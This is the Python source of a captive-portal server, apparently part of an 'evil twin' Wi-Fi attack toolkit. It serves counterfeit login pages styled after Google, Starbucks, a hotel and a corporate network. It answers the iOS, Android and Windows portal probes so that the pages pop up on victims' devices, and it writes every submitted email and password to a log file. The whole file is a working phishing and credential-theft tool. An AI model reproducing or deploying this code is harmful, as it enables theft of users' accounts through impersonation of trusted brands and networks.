#!/usr/bin/env python3
"""
apps/tools/evil_twin/portal_server.py
Captive portal web server.

- Serves HTML templates from menu_fs/04_files/portals/ (or built-in fallbacks)
- Logs captured credentials to JSON log file
- Handles captive portal detection for iOS, Android, Windows

Run as: sudo python3 portal_server.py <template_name_or_path> <log_file>
"""

import sys
import os
import json
import datetime
from flask import Flask, request, redirect, make_response

app = Flask(__name__)

TEMPLATE_ARG = sys.argv[1] if len(sys.argv) > 1 else "generic"
LOG_FILE     = sys.argv[2] if len(sys.argv) > 2 else "/tmp/evil_twin_creds.log"

# ── Built-in templates ────────────────────────────────────────

BUILTIN = {}

BUILTIN["generic"] = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Network Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:white;border-radius:8px;padding:32px;width:100%;max-width:360px;box-shadow:0 2px 12px rgba(0,0,0,.15)}
h2{text-align:center;color:#1a1a2e;margin-bottom:8px}
p{text-align:center;color:#666;margin-bottom:24px;font-size:14px}
input{width:100%;padding:12px;border:1px solid #ddd;border-radius:6px;font-size:15px;margin-bottom:14px}
button{width:100%;padding:12px;background:#4a90e2;color:white;border:none;border-radius:6px;font-size:16px;cursor:pointer}
.logo{text-align:center;font-size:32px;margin-bottom:16px}
</style></head><body>
<div class="card">
  <div class="logo">📶</div>
  <h2>Free Wi-Fi</h2>
  <p>Enter your details to connect</p>
  <form method="POST" action="/login">
    <input type="email" name="email" placeholder="Email address" required>
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Connect</button>
  </form>
</div></body></html>"""

BUILTIN["google"] = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:white;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
.logo{font-size:72px;font-weight:700;letter-spacing:-2px;margin-bottom:24px}
.logo span:nth-child(1){color:#4285F4}.logo span:nth-child(2){color:#EA4335}
.logo span:nth-child(3){color:#FBBC05}.logo span:nth-child(4){color:#4285F4}
.logo span:nth-child(5){color:#34A853}.logo span:nth-child(6){color:#EA4335}
.card{width:100%;max-width:400px;padding:0 24px}
h1{font-size:24px;color:#202124;text-align:center;margin-bottom:8px}
p{color:#5f6368;text-align:center;margin-bottom:24px;font-size:14px}
input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;margin-bottom:14px}
input:focus{border-color:#4285F4;border-width:2px}
button{width:100%;padding:13px;background:#4285F4;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
</style></head><body>
<div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<div class="card">
  <h1>Sign in</h1><p>Use your Google Account</p>
  <form method="POST" action="/login">
    <input type="email" name="email" placeholder="Email or phone" required>
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Next</button>
  </form>
</div></body></html>"""

BUILTIN["starbucks"] = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Starbucks WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Helvetica Neue',Arial,sans-serif;background:#1E3932;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:white;border-radius:12px;padding:36px;width:100%;max-width:360px}
.logo{text-align:center;color:#00704A;font-size:20px;font-weight:700;letter-spacing:2px;margin-bottom:20px}
.logo span{font-size:40px;display:block;margin-bottom:6px}
h2{text-align:center;color:#1E3932;font-size:20px;margin-bottom:6px}
p{text-align:center;color:#666;margin-bottom:22px;font-size:13px}
input{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:15px;margin-bottom:12px}
button{width:100%;padding:13px;background:#00704A;color:white;border:none;border-radius:50px;font-size:15px;font-weight:700;cursor:pointer}
</style></head><body>
<div class="card">
  <div class="logo"><span>☕</span>STARBUCKS</div>
  <h2>Welcome</h2><p>Sign in to enjoy complimentary Wi-Fi</p>
  <form method="POST" action="/login">
    <input type="email" name="email" placeholder="Email address" required>
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Connect</button>
  </form>
</div></body></html>"""

BUILTIN["hotel"] = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Hotel WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Georgia,serif;background:#2c2416;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#faf8f3;border-radius:4px;padding:40px;width:100%;max-width:380px;border-top:4px solid #c9a84c}
h1{color:#2c2416;font-size:26px;text-align:center;margin-bottom:6px}
.stars{text-align:center;color:#c9a84c;font-size:18px;margin-bottom:20px}
p{color:#666;text-align:center;margin-bottom:22px;font-size:13px}
label{display:block;font-size:11px;color:#888;letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
input{width:100%;padding:11px 12px;border:1px solid #ddd;font-size:15px;margin-bottom:16px}
button{width:100%;padding:13px;background:#2c2416;color:#c9a84c;border:none;font-family:Georgia;font-size:14px;letter-spacing:2px;cursor:pointer;text-transform:uppercase}
</style></head><body>
<div class="card">
  <h1>Grand Hotel</h1><div class="stars">★★★★★</div>
  <p>Welcome, valued guest. Sign in to access complimentary Wi-Fi.</p>
  <form method="POST" action="/login">
    <label>Email</label><input type="email" name="email" required>
    <label>Room / Password</label><input type="text" name="password">
    <button type="submit">Access Internet</button>
  </form>
</div></body></html>"""

BUILTIN["corporate"] = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Corporate Network</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f3f3;display:flex;align-items:center;justify-content:center;min-height:100vh}
.header{background:#0078d4;padding:12px 24px;color:white;font-size:13px}
.card{background:white;width:100%;max-width:400px;box-shadow:0 2px 8px rgba(0,0,0,.12)}
.body{padding:32px}
h2{color:#323130;font-size:20px;margin-bottom:6px}
p{color:#605e5c;font-size:13px;margin-bottom:24px}
label{display:block;font-size:13px;color:#323130;font-weight:600;margin-bottom:4px}
input{width:100%;padding:10px 12px;border:1px solid #8a8886;font-size:14px;margin-bottom:16px}
button{padding:10px 24px;background:#0078d4;color:white;border:none;font-size:14px;cursor:pointer}
</style></head><body>
<div class="card">
  <div class="header">🏢 Corporate Network Access</div>
  <div class="body">
    <h2>Sign in</h2><p>Use your corporate credentials.</p>
    <form method="POST" action="/login">
      <label>Username or Email</label>
      <input type="text" name="email" placeholder="user@company.com" required>
      <label>Password</label>
      <input type="password" name="password">
      <button type="submit">Sign in</button>
    </form>
  </div>
</div></body></html>"""

SUCCESS_PAGE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta http-equiv="refresh" content="3;url=http://google.com">
<title>Connected</title>
<style>
body{font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f0f2f5}
.card{background:white;padding:40px;border-radius:8px;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.1)}
.icon{font-size:48px;margin-bottom:16px}
h2{color:#333;margin-bottom:8px}p{color:#666;font-size:14px}
</style></head><body>
<div class="card">
  <div class="icon">✅</div>
  <h2>Connected!</h2>
  <p>You are now connected to the internet.<br>Redirecting...</p>
</div></body></html>"""

# ── Load template ─────────────────────────────────────────────

def _load_template() -> str:
    # If argument is a file path, load it directly
    if os.path.isfile(TEMPLATE_ARG):
        try:
            with open(TEMPLATE_ARG, "r", encoding="utf-8") as f:
                return f.read()
        except Exception as e:
            print(f"[Portal] Failed to load {TEMPLATE_ARG}: {e}")

    # Otherwise look in portals directory next to this script
    portals_dir = os.path.join(
        os.path.dirname(os.path.abspath(__file__)),
        "..", "..", "..", "menu_fs", "04_files", "portals"
    )
    portals_dir = os.path.realpath(portals_dir)
    candidate = os.path.join(portals_dir, TEMPLATE_ARG + ".html")
    if os.path.isfile(candidate):
        try:
            with open(candidate, "r", encoding="utf-8") as f:
                print(f"[Portal] Loaded template from: {candidate}")
                return f.read()
        except Exception as e:
            print(f"[Portal] Failed to load {candidate}: {e}")

    # Fall back to built-in
    html = BUILTIN.get(TEMPLATE_ARG, BUILTIN["generic"])
    print(f"[Portal] Using built-in template: {TEMPLATE_ARG}")
    return html


PORTAL_HTML = _load_template()


# ── Routes ────────────────────────────────────────────────────

def _portal_response():
    resp = make_response(PORTAL_HTML)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    resp.headers["Cache-Control"] = "no-store"
    return resp


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def index(path):
    return _portal_response()


@app.route("/login", methods=["POST"])
def login():
    email    = request.form.get("email", "").strip()
    password = request.form.get("password", "").strip()
    ip       = request.remote_addr
    ua       = request.headers.get("User-Agent", "")[:80]
    ts       = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {"time": ts, "ip": ip, "email": email,
             "password": password, "ua": ua, "template": TEMPLATE_ARG}
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception as e:
        print(f"[Portal] Log error: {e}")

    print(f"[Portal] CAPTURED: {email} / {password} from {ip}")

    resp = make_response(SUCCESS_PAGE)
    resp.headers["Content-Type"] = "text/html; charset=utf-8"
    return resp


# ── Captive portal detection ──────────────────────────────────
# iOS checks /hotspot-detect.html — must return HTML directly (not redirect)
# Android checks /generate_204 — must return 302
# Windows checks /ncsi.txt and /connecttest.txt

@app.route("/hotspot-detect.html")
def ios_detect():
    """iOS captive portal probe — return portal HTML directly."""
    return _portal_response()

@app.route("/generate_204")
@app.route("/connecttest.txt")
@app.route("/ncsi.txt")
@app.route("/success.txt")
@app.route("/library/test/success.html")
def captive_check():
    """Android/Windows captive portal probe — redirect to portal."""
    return redirect("/", 302)


if __name__ == "__main__":
    import logging
    logging.getLogger("werkzeug").setLevel(logging.ERROR)
    print(f"[Portal] Starting on :80 | template={TEMPLATE_ARG} | log={LOG_FILE}")
    app.run(host="0.0.0.0", port=80, debug=False, threaded=True)
